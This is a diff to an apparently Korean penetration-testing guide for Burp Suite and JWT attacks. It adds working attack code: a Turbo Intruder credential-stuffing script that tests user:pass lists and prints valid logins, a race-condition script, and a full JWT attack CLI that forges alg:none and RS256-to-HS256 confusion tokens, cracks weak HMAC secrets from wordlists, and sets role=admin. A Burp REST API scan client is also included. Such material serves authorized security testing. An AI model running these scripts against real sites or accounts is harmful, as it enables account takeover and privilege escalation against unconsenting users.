@@ -237,41 +237,294 @@ Options:
 ### Turbo Intruder (고속 요청)
 
 ```python
-# race_condition.py - Turbo Intruder 스크립트
+# race_condition.py — Turbo Intruder 스크립트 (Burp Suite 내에서 실행)
+#
+# 사용법:
+#   1. Burp Proxy History에서 대상 요청 우클릭
+#   2. Extensions > Turbo Intruder > Send to Turbo Intruder
+#   3. 이 스크립트 붙여넣기 → Attack 클릭
+#
+# gate 기법: 요청들을 큐에 쌓은 뒤 openGate로 동시 해제
+# → 서버가 동시 요청을 처리하지 못할 때 레이스 컨디션 발생
+
 def queueRequests(target, wordlists):
-    engine = RequestEngine(endpoint=target.endpoint,
-                          concurrentConnections=50,
-                          requestsPerConnection=100,
-                          pipeline=False)
-    
-    # 레이스 컨디션 테스트: 동시에 100개 요청
+    engine = RequestEngine(
+        endpoint=target.endpoint,
+        concurrentConnections=50,
+        requestsPerConnection=1,
+        pipeline=False,
+        engine=Engine.THREADED,
+    )
+
+    # 100개 요청을 gate 'race1'로 묶어 동시 전송
     for i in range(100):
-        engine.queue(target.req, str(i))
-    
-    engine.start(timeout=10)
+        engine.queue(target.req, str(i), gate='race1')
+
+    engine.openGate('race1')
+    engine.complete(timeout=30)
+
 
 def handleResponse(req, interesting):
-    # 200 OK 응답 모두 표시
     if req.status == 200:
         table.add(req)
 ```
 
 ```python
-# credential_stuffing.py - 대량 크리덴셜 스터핑
+# credential_stuffing.py — 대량 크리덴셜 스터핑 (Turbo Intruder)
+#
+# 요청 템플릿에서 § 마커 위치:
+#   username=§user§&password=§pass§
+# wordlists: user:pass 형식 파일
+
 def queueRequests(target, wordlists):
-    engine = RequestEngine(endpoint=target.endpoint,
-                          concurrentConnections=5,
-                          requestsPerConnection=1,
-                          pipeline=False)
-    
-    for cred in open('/tmp/credentials.txt'):
-        user, password = cred.strip().split(':')
+    engine = RequestEngine(
+        endpoint=target.endpoint,
+        concurrentConnections=5,
+        requestsPerConnection=1,
+        pipeline=False,
+    )
+
+    for cred in open('/tmp/credentials.txt', encoding='utf-8'):
+        cred = cred.strip()
+        if ':' not in cred:
+            continue
+        user, password = cred.split(':', 1)
         engine.queue(target.req, [user, password])
 
+
 def handleResponse(req, interesting):
-    if 'Welcome' in req.response or req.status == 302:
+    # 성공 조건: 302 리다이렉트 또는 "Welcome" 포함
+    if req.status == 302 or 'Welcome' in req.response or 'dashboard' in req.response.lower():
         table.add(req)
-        print(f"[+] Valid: {req.payload[0]}:{req.payload[1]}")
+        print(f'[+] Valid: {req.payloads[0]}:{req.payloads[1]}')
+```
+
+### Burp Suite REST API Python 클라이언트
+
+```python
+#!/usr/bin/env python3
+"""
+Burp Suite Professional REST API 클라이언트
+요구사항: pip install requests
+Burp 설정: Project Options > Misc > Burp Collaborator > 활성화
+           User Options > Suite > REST API > 활성화 (포트 1337, 기본)
+"""
+
+from __future__ import annotations
+
+import argparse
+import json
+import sys
+import textwrap
+import time
+from dataclasses import dataclass
+from pathlib import Path
+from typing import Optional
+from urllib.parse import urljoin
+
+import requests
+
+
+# ── Burp REST API 클라이언트 ──────────────────────────────────────────────────
+
+class BurpClient:
+    """Burp Suite Pro REST API 래퍼."""
+
+    def __init__(self, base_url: str = "http://127.0.0.1:1337", api_key: str = "") -> None:
+        self.base = base_url.rstrip("/") + "/"
+        self.session = requests.Session()
+        if api_key:
+            self.session.headers["Authorization"] = api_key
+
+    def _get(self, path: str, **kwargs) -> dict:
+        resp = self.session.get(urljoin(self.base, path), timeout=30, **kwargs)
+        resp.raise_for_status()
+        return resp.json() if resp.content else {}
+
+    def _post(self, path: str, data: dict) -> dict:
+        resp = self.session.post(urljoin(self.base, path), json=data, timeout=30)
+        resp.raise_for_status()
+        return resp.json() if resp.content else {}
+
+    # ── 스캔 관리 ────────────────────────────────────────────────────────────
+
+    def start_scan(
+        self,
+        url: str,
+        scan_config: Optional[list[str]] = None,
+        credentials: Optional[dict] = None,
+    ) -> str:
+        """스캔 시작. task_id 반환."""
+        payload: dict = {"urls": [url]}
+        if scan_config:
+            payload["scan_configurations"] = [{"name": c} for c in scan_config]
+        if credentials:
+            payload["application_logins"] = [credentials]
+
+        data = self._post("v0.1/scan", payload)
+        task_id = data.get("task_id", "")
+        print(f"[+] 스캔 시작: {url} → task_id={task_id}")
+        return task_id
+
+    def get_scan_status(self, task_id: str) -> dict:
+        return self._get(f"v0.1/scan/{task_id}")
+
+    def wait_for_scan(self, task_id: str, poll_interval: int = 10) -> dict:
+        """스캔 완료까지 폴링."""
+        print(f"[*] 스캔 대기 중 (task_id={task_id})...")
+        while True:
+            status = self.get_scan_status(task_id)
+            scan_status = status.get("scan_status", "")
+            metrics = status.get("scan_metrics", {})
+            progress = metrics.get("crawl_progress", 0)
+            audited = metrics.get("audit_progress", 0)
+
+            print(f"    상태: {scan_status} | 크롤: {progress}% | 감사: {audited}%")
+
+            if scan_status in ("succeeded", "failed"):
+                return status
+            time.sleep(poll_interval)
+
+    def get_issues(self, task_id: str) -> list[dict]:
+        """스캔 결과의 취약점 목록 반환."""
+        status = self.get_scan_status(task_id)
+        return status.get("issue_events", [])
+
+    def cancel_scan(self, task_id: str) -> None:
+        self._post(f"v0.1/scan/{task_id}/cancel", {})
+        print(f"[+] 스캔 취소: {task_id}")
+
+    # ── 취약점 파싱 ──────────────────────────────────────────────────────────
+
+    def parse_issues(self, issues: list[dict]) -> list[dict]:
+        """issue_events를 간결한 취약점 목록으로 변환."""
+        parsed: list[dict] = []
+        for event in issues:
+            issue = event.get("issue", {})
+            if not issue:
+                continue
+            parsed.append({
+                "type": issue.get("type_name", "Unknown"),
+                "severity": issue.get("severity", "information"),
+                "confidence": issue.get("confidence", "firm"),
+                "url": issue.get("origin", ""),
+                "path": issue.get("path", ""),
+                "serial": issue.get("serial_number", ""),
+                "description": issue.get("description", "")[:200],
+            })
+        # 심각도 순 정렬
+        order = {"high": 0, "medium": 1, "low": 2, "information": 3}
+        return sorted(parsed, key=lambda i: order.get(i["severity"].lower(), 99))
+
+
+# ── 보고서 저장 ───────────────────────────────────────────────────────────────
+
+def save_issues(issues: list[dict], out_path: Path) -> None:
+    out_path.write_text(
+        json.dumps(issues, ensure_ascii=False, indent=2), encoding="utf-8"
+    )
+    print(f"[+] 취약점 저장: {out_path} ({len(issues)}개)")
+
+
+def print_summary(issues: list[dict]) -> None:
+    from collections import Counter
+    counts = Counter(i["severity"].lower() for i in issues)
+    print(f"\n{'='*50}")
+    print(f"  HIGH   : {counts.get('high', 0)}")
+    print(f"  MEDIUM : {counts.get('medium', 0)}")
+    print(f"  LOW    : {counts.get('low', 0)}")
+    print(f"  INFO   : {counts.get('information', 0)}")
+    print(f"  합계   : {len(issues)}")
+    print(f"{'='*50}\n")
+
+    for issue in issues:
+        sev = issue["severity"].upper()[:4]
+        print(f"  [{sev}] {issue['type']:<40} {issue['url']}{issue['path']}")
+
+
+# ── CLI ───────────────────────────────────────────────────────────────────────
+
+def main() -> None:
+    parser = argparse.ArgumentParser(
+        description="Burp Suite REST API Python 클라이언트",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog=textwrap.dedent(
+            """
+            사전 요건:
+              Burp Suite Pro → User Options → REST API → 활성화 (포트 1337)
+
+            사용 예시:
+              # 스캔 시작 + 완료 대기 + 결과 저장
+              python burp_client.py scan -u https://target.com -o issues.json
+
+              # 기존 스캔 결과 조회
+              python burp_client.py issues --task-id abc123 -o issues.json
+
+              # 스캔 취소
+              python burp_client.py cancel --task-id abc123
+            """
+        ),
+    )
+    parser.add_argument("--burp-url", default="http://127.0.0.1:1337", help="Burp REST API URL")
+    parser.add_argument("--api-key", default="", help="Burp API 키")
+
+    sub = parser.add_subparsers(dest="cmd", required=True)
+
+    p_scan = sub.add_parser("scan", help="스캔 시작 및 결과 수집")
+    p_scan.add_argument("-u", "--url", required=True)
+    p_scan.add_argument("--config", nargs="*", help="스캔 구성 이름")
+    p_scan.add_argument("--username")
+    p_scan.add_argument("--password")
+    p_scan.add_argument("--wait", action="store_true", default=True)
+    p_scan.add_argument("-o", "--output", type=Path, default=None)
+
+    p_issues = sub.add_parser("issues", help="스캔 결과 조회")
+    p_issues.add_argument("--task-id", required=True)
+    p_issues.add_argument("-o", "--output", type=Path, default=None)
+
+    p_cancel = sub.add_parser("cancel", help="스캔 취소")
+    p_cancel.add_argument("--task-id", required=True)
+
+    args = parser.parse_args()
+
+    client = BurpClient(args.burp_url, args.api_key)
+
+    try:
+        if args.cmd == "scan":
+            creds = None
+            if args.username and args.password:
+                creds = {"username": args.username, "password": args.password}
+            task_id = client.start_scan(args.url, scan_config=args.config, credentials=creds)
+
+            if args.wait:
+                client.wait_for_scan(task_id)
+                raw_issues = client.get_issues(task_id)
+                issues = client.parse_issues(raw_issues)
+                print_summary(issues)
+                if args.output:
+                    save_issues(issues, args.output)
+
+        elif args.cmd == "issues":
+            raw_issues = client.get_issues(args.task_id)
+            issues = client.parse_issues(raw_issues)
+            print_summary(issues)
+            if args.output:
+                save_issues(issues, args.output)
+
+        elif args.cmd == "cancel":
+            client.cancel_scan(args.task_id)
+
+    except requests.ConnectionError:
+        sys.exit(
+            f"[-] Burp Suite에 연결할 수 없습니다 ({args.burp_url})\n"
+            "    User Options → REST API → Enable 확인"
+        )
+    except requests.HTTPError as exc:
+        sys.exit(f"[-] API 오류: {exc}")
+
+
+if __name__ == "__main__":
+    main()
 ```
 
 ### Logger++ (고급 로깅)
@@ -371,39 +624,229 @@ SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
 ### JWT 공격 기법
 
 ```python
-import jwt
+#!/usr/bin/env python3
+"""
+JWT 취약점 분석 및 공격 CLI
+요구사항: pip install pyjwt cryptography requests
+"""
+
+from __future__ import annotations
+
+import argparse
 import base64
 import json
+import sys
+import textwrap
+from pathlib import Path
+from typing import Any, Optional
 
-# 1. alg:none 공격
-header = {"alg": "none", "typ": "JWT"}
-payload = {"sub": "1234", "role": "admin"}
+try:
+    import jwt as pyjwt
+except ImportError:
+    sys.exit("[-] pip install pyjwt cryptography")
 
-# 서명 없이 토큰 생성
-token = base64.b64encode(json.dumps(header).encode()).decode() + "." + \
-        base64.b64encode(json.dumps(payload).encode()).decode() + "."
 
-# 2. RS256 → HS256 알고리즘 혼동
-# 서버의 공개키(RSA)를 HMAC 비밀키로 사용
-with open('public_key.pem', 'r') as f:
-    public_key = f.read()
+# ── JWT 파서 ──────────────────────────────────────────────────────────────────
 
-# HS256으로 공개키로 서명
-token = jwt.encode({"sub": "1", "role": "admin"}, 
-                   public_key, 
-                   algorithm="HS256")
+def decode_jwt_insecure(token: str) -> tuple[dict, dict]:
+    """서명 검증 없이 JWT 헤더·페이로드 디코딩."""
+    parts = token.split(".")
+    if len(parts) < 2:
+        raise ValueError("JWT 형식 오류 (점으로 구분된 3부분 필요)")
 
-# 3. 약한 비밀키 브루트포스
-# hashcat -a 0 -m 16500 jwt_token.txt wordlist.txt
-```
+    def _b64_decode(data: str) -> dict:
+        padding = 4 - len(data) % 4
+        data += "=" * (padding % 4)
+        return json.loads(base64.urlsafe_b64decode(data))
 
-```bash
-# jwt_tool 사용법
-pip install jwt_tool
-python3 jwt_tool.py [TOKEN] -T        # 변조 모드
-python3 jwt_tool.py [TOKEN] -X a      # alg:none 공격
-python3 jwt_tool.py [TOKEN] -X s      # 서명 혼동 공격
-python3 jwt_tool.py [TOKEN] -C -d wordlist.txt  # 비밀키 크랙
+    return _b64_decode(parts[0]), _b64_decode(parts[1])
+
+
+# ── alg:none 공격 ─────────────────────────────────────────────────────────────
+
+def attack_alg_none(token: str, payload_override: Optional[dict] = None) -> str:
+    """alg:none 공격 — 서명 없는 JWT 생성."""
+    _, payload = decode_jwt_insecure(token)
+
+    if payload_override:
+        payload.update(payload_override)
+
+    new_header = {"alg": "none", "typ": "JWT"}
+
+    def _b64_encode(data: dict) -> str:
+        return base64.urlsafe_b64encode(
+            json.dumps(data, separators=(",", ":")).encode()
+        ).rstrip(b"=").decode()
+
+    return f"{_b64_encode(new_header)}.{_b64_encode(payload)}."
+
+
+# ── RS256 → HS256 알고리즘 혼동 공격 ─────────────────────────────────────────
+
+def attack_alg_confusion(token: str, public_key_path: Path,
+                          payload_override: Optional[dict] = None) -> str:
+    """RS256→HS256 알고리즘 혼동: 서버 RSA 공개키로 HMAC 서명."""
+    _, payload = decode_jwt_insecure(token)
+    if payload_override:
+        payload.update(payload_override)
+
+    public_key_pem = public_key_path.read_text()
+    forged = pyjwt.encode(payload, public_key_pem, algorithm="HS256")
+    return forged if isinstance(forged, str) else forged.decode()
+
+
+# ── 약한 비밀키 크래킹 ────────────────────────────────────────────────────────
+
+def crack_secret(token: str, wordlist_path: Path, max_attempts: int = 100_000) -> Optional[str]:
+    """HMAC 기반 JWT의 비밀키를 wordlist에서 찾기."""
+    _, payload = decode_jwt_insecure(token)
+    alg = decode_jwt_insecure(token)[0].get("alg", "HS256")
+
+    if not alg.startswith("HS"):
+        print(f"[!] 알고리즘 {alg}은 HMAC이 아닙니다.")
+        return None
+
+    print(f"[*] 비밀키 크래킹 시작 (최대 {max_attempts:,}개)...")
+    tried = 0
+    with open(wordlist_path, encoding="utf-8", errors="ignore") as f:
+        for line in f:
+            if tried >= max_attempts:
+                break
+            secret = line.strip()
+            if not secret:
+                continue
+            tried += 1
+            try:
+                pyjwt.decode(token, secret, algorithms=[alg])
+                print(f"\n[+] 비밀키 발견: {secret!r} ({tried:,}번째)")
+                return secret
+            except pyjwt.InvalidSignatureError:
+                continue
+            except pyjwt.DecodeError:
+                continue
+            except Exception:
+                continue
+
+            if tried % 10000 == 0:
+                print(f"    {tried:,}개 시도...", end="\r")
+
+    print(f"\n[-] {tried:,}개 시도 후 비밀키 미발견")
+    return None
+
+
+# ── JWT 변조 ─────────────────────────────────────────────────────────────────
+
+def forge_with_secret(token: str, secret: str, payload_override: dict) -> str:
+    """알려진 비밀키로 페이로드를 변조한 새 JWT 생성."""
+    header, payload = decode_jwt_insecure(token)
+    alg = header.get("alg", "HS256")
+    payload.update(payload_override)
+    forged = pyjwt.encode(payload, secret, algorithm=alg, headers=header)
+    return forged if isinstance(forged, str) else forged.decode()
+
+
+# ── CLI ───────────────────────────────────────────────────────────────────────
+
+def main() -> None:
+    parser = argparse.ArgumentParser(
+        description="JWT 취약점 분석 및 공격 도구",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog=textwrap.dedent(
+            """
+            사용 예시:
+              # JWT 디코딩
+              python jwt_attack.py decode eyJhbGci...
+
+              # alg:none 공격 (role을 admin으로 변조)
+              python jwt_attack.py none eyJhbGci... --set role=admin
+
+              # RS256→HS256 알고리즘 혼동
+              python jwt_attack.py confusion eyJhbGci... --key public.pem --set role=admin
+
+              # 비밀키 크래킹
+              python jwt_attack.py crack eyJhbGci... --wordlist rockyou.txt
+
+              # 알려진 비밀키로 페이로드 변조
+              python jwt_attack.py forge eyJhbGci... --secret mysecret --set sub=admin
+            """
+        ),
+    )
+    sub = parser.add_subparsers(dest="cmd", required=True)
+
+    # decode
+    p_dec = sub.add_parser("decode", help="JWT 디코딩 (서명 미검증)")
+    p_dec.add_argument("token")
+
+    # none
+    p_none = sub.add_parser("none", help="alg:none 공격")
+    p_none.add_argument("token")
+    p_none.add_argument("--set", nargs="*", metavar="KEY=VALUE",
+                        help="페이로드 변조 (예: role=admin)")
+
+    # confusion
+    p_conf = sub.add_parser("confusion", help="RS256→HS256 알고리즘 혼동")
+    p_conf.add_argument("token")
+    p_conf.add_argument("--key", type=Path, required=True, help="RSA 공개키 PEM 파일")
+    p_conf.add_argument("--set", nargs="*", metavar="KEY=VALUE")
+
+    # crack
+    p_crack = sub.add_parser("crack", help="HMAC 비밀키 크래킹")
+    p_crack.add_argument("token")
+    p_crack.add_argument("--wordlist", type=Path, required=True)
+    p_crack.add_argument("--max", type=int, default=100_000)
+
+    # forge
+    p_forge = sub.add_parser("forge", help="알려진 비밀키로 변조")
+    p_forge.add_argument("token")
+    p_forge.add_argument("--secret", required=True)
+    p_forge.add_argument("--set", nargs="*", metavar="KEY=VALUE", required=True)
+
+    args = parser.parse_args()
+
+    def parse_overrides(pairs: list[str] | None) -> dict:
+        if not pairs:
+            return {}
+        result: dict[str, Any] = {}
+        for p in pairs:
+            k, _, v = p.partition("=")
+            try:
+                result[k] = json.loads(v)
+            except json.JSONDecodeError:
+                result[k] = v
+        return result
+
+    if args.cmd == "decode":
+        header, payload = decode_jwt_insecure(args.token)
+        print("Header:")
+        print(json.dumps(header, indent=2, ensure_ascii=False))
+        print("Payload:")
+        print(json.dumps(payload, indent=2, ensure_ascii=False))
+
+    elif args.cmd == "none":
+        overrides = parse_overrides(args.set)
+        forged = attack_alg_none(args.token, overrides)
+        print(f"[+] alg:none 토큰:\n{forged}")
+
+    elif args.cmd == "confusion":
+        overrides = parse_overrides(args.set)
+        forged = attack_alg_confusion(args.token, args.key, overrides)
+        print(f"[+] HS256 혼동 토큰:\n{forged}")
+
+    elif args.cmd == "crack":
+        secret = crack_secret(args.token, args.wordlist, args.max)
+        if secret:
+            print(f"\n[+] 비밀키: {secret}")
+            print("    위조 예: python jwt_attack.py forge <token> "
+                  f"--secret '{secret}' --set role=admin")
+
+    elif args.cmd == "forge":
+        overrides = parse_overrides(args.set)
+        forged = forge_with_secret(args.token, args.secret, overrides)
+        print(f"[+] 변조된 토큰:\n{forged}")
+
+
+if __name__ == "__main__":
+    main()
 ```
 
 ---
